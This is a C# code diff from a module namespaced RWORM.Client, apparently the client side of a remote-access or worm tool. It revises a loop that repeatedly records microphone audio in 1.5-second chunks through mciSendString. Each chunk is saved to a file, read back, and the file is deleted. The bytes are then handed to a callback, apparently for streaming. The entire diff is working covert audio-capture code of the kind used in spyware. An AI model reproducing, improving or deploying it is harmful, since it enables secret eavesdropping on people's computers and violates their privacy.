@@ -39,41 +39,53 @@ namespace RWORM.Client.Modules
 
                     try
                     {
-                        mciSendString($"open new type waveaudio alias {alias}", null, 0, IntPtr.Zero);
-                        // Record 16-bit 16000Hz mono PCM wave
-                        mciSendString($"set {alias} time format ms bitspersample 16 channels 1 samplespersec 16000", null, 0, IntPtr.Zero);
-                        mciSendString($"record {alias}", null, 0, IntPtr.Zero);
-
-                        // Capture in chunks of 1.5 seconds for low latency streaming
-                        int waited = 0;
-                        while (_recording && waited < 1500)
+                        // Open waveaudio
+                        int openRes = mciSendString($"open new type waveaudio alias {alias}", null, 0, IntPtr.Zero);
+                        if (openRes == 0)
                         {
-                            Thread.Sleep(100);
-                            waited += 100;
-                        }
+                            // Set time format
+                            mciSendString($"set {alias} time format ms", null, 0, IntPtr.Zero);
 
-                        mciSendString($"stop {alias}", null, 0, IntPtr.Zero);
-                        mciSendString($"save {alias} \"{filePath}\"", null, 0, IntPtr.Zero);
-                        mciSendString($"close {alias}", null, 0, IntPtr.Zero);
+                            // Start recording
+                            mciSendString($"record {alias}", null, 0, IntPtr.Zero);
 
-                        if (File.Exists(filePath))
-                        {
-                            byte[] wavBytes = File.ReadAllBytes(filePath);
-                            try { File.Delete(filePath); } catch { }
-
-                            if (wavBytes.Length > 44) // WAV header is 44 bytes
+                            // Wait 1.5 seconds per chunk
+                            int waited = 0;
+                            while (_recording && waited < 1500)
                             {
-                                try
-                                {
-                                    _onChunk(wavBytes).Wait(500);
-                                }
-                                catch { }
+                                Thread.Sleep(100);
+                                waited += 100;
                             }
+
+                            // Stop, save, close
+                            mciSendString($"stop {alias}", null, 0, IntPtr.Zero);
+                            mciSendString($"save {alias} \"{filePath}\"", null, 0, IntPtr.Zero);
+                            mciSendString($"close {alias}", null, 0, IntPtr.Zero);
+
+                            if (File.Exists(filePath))
+                            {
+                                byte[] wavBytes = File.ReadAllBytes(filePath);
+                                try { File.Delete(filePath); } catch { }
+
+                                if (wavBytes.Length > 44)
+                                {
+                                    try
+                                    {
+                                        _onChunk(wavBytes).Wait(500);
+                                    }
+                                    catch { }
+                                }
+                            }
+                        }
+                        else
+                        {
+                            Thread.Sleep(500);
                         }
                     }
                     catch
                     {
                         try { mciSendString($"close {alias}", null, 0, IntPtr.Zero); } catch { }
+                        Thread.Sleep(500);
                     }
                 }
             });
